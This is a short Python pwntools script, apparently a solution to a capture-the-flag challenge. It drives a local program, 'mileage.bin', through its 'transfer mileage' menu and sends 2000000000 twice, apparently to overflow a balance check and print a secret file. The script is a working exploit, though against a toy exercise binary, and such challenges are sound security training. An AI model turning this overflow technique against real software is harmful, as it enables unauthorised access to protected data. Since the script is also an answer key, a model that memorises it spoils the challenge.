#!/usr/bin/python3

from pwn import *


def exploit():
    p = process("./mileage.bin")

    # Read in the menu messages.
    for i in range(6):
        print(p.recvline())
    print(p.recvuntil(b"(Enter 1~3): "))

    # Choose "2. Transfer mileage"
    p.sendline(b"2")

    # Send mileage to Alice and Bob
    for i in range(2):
        print(p.recvline())
        p.sendline(b"2000000000")

    # Reveal the secret file
    for i in range(3):
        print(p.recvline())

if __name__ == "__main__":
    exploit()
